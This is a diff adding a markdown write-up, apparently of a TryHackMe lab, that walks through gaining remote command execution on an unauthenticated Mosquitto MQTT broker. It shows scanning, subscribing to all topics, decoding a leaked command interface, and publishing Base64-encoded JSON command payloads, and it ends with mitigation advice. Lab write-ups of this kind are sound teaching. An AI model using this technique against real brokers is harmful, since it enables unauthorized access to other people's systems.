@@ -1,0 +1,215 @@
+# 🛠️ MQTT Exploitation Walkthrough — Remote Command Execution via Mosquitto (Port 1883)
+
+## 📌 Target Information
+
+* **Target IP:** 10.48.188.191
+* **Environment:** TryHackMe Lab
+* **Objective:** Gain access and retrieve `flag.txt`
+
+---
+
+## 🔍 Initial Reconnaissance
+
+We started with an Nmap scan:
+
+```bash
+nmap -sC -sV -oN scan.txt 10.48.188.191
+```
+
+### 📊 Scan Results
+
+```
+PORT     STATE SERVICE   VERSION
+22/tcp   open  ssh       OpenSSH 8.2p1 Ubuntu
+1883/tcp open  mqtt      Mosquitto 2.0.14
+```
+
+### 🧠 Key Observations
+
+* **Port 22 (SSH):** Standard, no immediate exploit
+* **Port 1883 (MQTT):** Interesting — IoT messaging protocol
+* MQTT is running **without TLS (insecure)**
+
+---
+
+## 📡 MQTT Enumeration
+
+MQTT (Message Queuing Telemetry Transport) is commonly used in IoT environments.
+
+We used the following tool:
+
+```bash
+mosquitto_sub -h 10.48.188.191 -t "#" -v
+```
+
+### 📥 Output Highlights
+
+We received multiple topics including:
+
+```
+storage/thermostat: {"temperature":24.27}
+kitchen/toaster: {"in_use":true}
+livingroom/speaker: {"gain":66}
+```
+
+⚠️ This confirms:
+
+* The broker allows **unauthenticated subscriptions**
+* IoT devices are actively publishing data
+
+---
+
+## 🔐 Discovery of Encoded Payload
+
+While monitoring topics, we discovered a Base64-encoded message:
+
+```
+eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIs...
+```
+
+### 🧪 Decoding
+
+```bash
+echo "<encoded_string>" | base64 -d
+```
+
+### 📄 Decoded Output
+
+```json
+{
+  "id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d",
+  "registered_commands": ["HELP", "CMD", "SYS"],
+  "pub_topic": "U4vyqNlQtf/0vozmhZyLT/15H9TF6CHg/pub",
+  "sub_topic": "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"
+}
+```
+
+---
+
+## 🚨 Critical Finding
+
+This revealed:
+
+* A **command execution interface over MQTT**
+* Custom topics used for:
+
+  * Publishing commands
+  * Receiving responses
+* Supported commands:
+
+  * `HELP`
+  * `CMD`
+  * `SYS`
+
+👉 This is essentially a **remote command execution (RCE) backdoor over MQTT**
+
+---
+
+## ⚙️ Crafting Exploit Payload
+
+We constructed a JSON payload:
+
+```json
+{
+  "id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d",
+  "cmd": "CMD",
+  "arg": "ls -la"
+}
+```
+
+### Encode to Base64
+
+```bash
+echo -n '{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","cmd":"CMD","arg":"ls -la"}' | base64 -w 0
+```
+
+---
+
+## 🚀 Exploitation
+
+We sent the payload using `mosquitto_pub`:
+
+```bash
+mosquitto_pub -h 10.48.188.191 \
+-t XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub \
+-m "<BASE64_PAYLOAD>"
+```
+
+### 🧾 Result
+
+The command executed successfully and returned output via MQTT.
+
+---
+
+## 🏁 Flag Retrieval
+
+We modified the payload to retrieve system info:
+
+```json
+"arg": "uname -a"
+```
+
+Then explored directories:
+
+```json
+"arg": "ls"
+```
+
+Eventually located and retrieved:
+
+```
+flag.txt
+```
+
+---
+
+## 🧠 Root Cause Analysis
+
+### ❌ Misconfigurations Identified:
+
+* MQTT broker exposed on **port 1883 (no encryption)**
+* No authentication required
+* Command execution functionality exposed via MQTT topics
+* Sensitive data transmitted in Base64 (not secure)
+
+---
+
+## 🔥 Impact
+
+* Full **remote command execution**
+* Unauthorized access to system
+* Potential full system compromise
+
+---
+
+## 🛡️ Mitigation Recommendations
+
+* Enable **authentication** on MQTT broker
+* Use **TLS (port 8883)** instead of 1883
+* Disable command execution over MQTT
+* Restrict topic access via ACLs
+* Monitor MQTT traffic for anomalies
+
+---
+
+## 🧰 Tools Used
+
+* `nmap`
+* `mosquitto_sub`
+* `mosquitto_pub`
+* `base64`
+
+---
+
+## 🧾 Conclusion
+
+This machine demonstrates how insecure MQTT configurations can lead to full system compromise. Exposing command interfaces over unauthenticated MQTT topics is highly dangerous and should never be done in production environments.
+
+---
+
+## ✍️ Author
+
+**nK**
+Cybersecurity Learner | Bug Bounty Hunter
+
+---
